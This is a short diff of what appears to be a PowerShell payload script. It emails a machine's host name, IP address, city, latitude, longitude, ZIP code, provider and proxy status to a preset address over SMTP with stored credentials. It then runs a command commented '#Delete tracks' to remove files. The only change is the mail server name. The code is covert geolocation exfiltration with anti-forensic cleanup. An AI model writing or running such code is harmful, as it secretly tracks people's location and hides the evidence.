@@ -29,7 +29,7 @@ $as = $object.as
 $is_proxy = $object.is_proxy
 
 #Send email
-Send-MailMessage -From "User geolocation <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USERHOST geolocation" -Body "$USERHOST geolocation =>`n`nIP: $ip `nCountry code: $country_code `nCountry name: $country_name `nRegion name: $region_name `nCity name: $city_name `nLatitude: $latitude `nLongitude: $longitude `nZIP code: $zip_code `nTime zone: $time_zone `nProvider: $as `nProxy: $is_proxy" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
+Send-MailMessage -From "User geolocation <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USERHOST geolocation" -Body "$USERHOST geolocation =>`n`nIP: $ip `nCountry code: $country_code `nCountry name: $country_name `nRegion name: $region_name `nCity name: $city_name `nLatitude: $latitude `nLongitude: $longitude `nZIP code: $zip_code `nTime zone: $time_zone `nProvider: $as `nProxy: $is_proxy" -SmtpServer smtp.test.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
 
 #Delete tracks
 del gug*
